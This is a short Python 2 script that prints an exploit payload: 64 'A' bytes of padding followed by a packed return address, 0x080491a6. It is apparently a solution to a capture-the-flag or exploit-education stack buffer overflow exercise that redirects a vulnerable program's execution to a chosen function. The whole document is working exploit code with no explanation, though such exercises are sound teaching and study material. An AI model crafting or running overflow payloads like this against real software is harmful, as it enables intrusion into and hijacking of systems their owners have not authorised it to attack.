#! /bin/python2

import struct

buffer = "A"*64
payload = struct.pack("I", 0x080491a6)

print buffer+payload
